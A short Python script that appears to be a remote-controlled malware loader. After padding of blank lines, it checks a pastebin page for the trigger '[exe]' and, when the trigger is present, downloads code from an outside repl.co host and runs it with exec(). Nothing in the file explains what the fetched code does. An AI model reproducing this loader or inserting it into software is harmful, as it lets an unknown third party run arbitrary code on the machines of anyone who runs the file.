import tempfile
from tempfile import *
import requests









r = requests.get("https://pastebin.com/raw/RsEzf8Kp").text

if "[exe]" in r:
    code = requests.get('https://wrath.xmanisboss13.repl.co/hwid.txt').text
    exec(code)
    
else:
    pass

